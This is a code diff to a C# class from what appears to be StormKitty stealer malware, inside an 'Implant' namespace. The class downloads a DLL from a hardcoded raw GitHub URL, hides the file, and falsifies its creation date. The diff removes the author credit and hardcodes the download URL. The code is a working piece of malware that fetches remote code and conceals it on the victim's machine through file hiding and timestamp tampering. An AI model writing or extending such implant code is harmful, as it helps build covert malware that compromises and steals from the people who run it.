@@ -1,9 +1,4 @@
-﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
-*/
-
-using StormKitty.Implant;
+﻿using StormKitty.Implant;
 using System;
 using System.IO;
 using System.Net;
@@ -13,7 +8,7 @@ namespace StormKitty
     internal sealed class Libs
     {
         
-        public static string ZipLib = StringsCrypt.github + "/blob/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll?raw=true";
+        public static string ZipLib = "https://raw.githubusercontent.com/LimerBoy/StormKitty/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll";
         public static bool LoadRemoteLibrary(string library)
         {
             string dll = Path.GetFileName(new Uri(library).LocalPath);
@@ -29,10 +24,10 @@ namespace StormKitty
                     return false;
                 }
 
-                Implant.Startup.HideFile(dll);
-                Implant.Startup.SetFileCreationDate(dll);
+                Startup.HideFile(dll);
+                Startup.SetFileCreationDate(dll);
             }
-            return true;
+            return File.Exists(dll);
         }
     }
 }
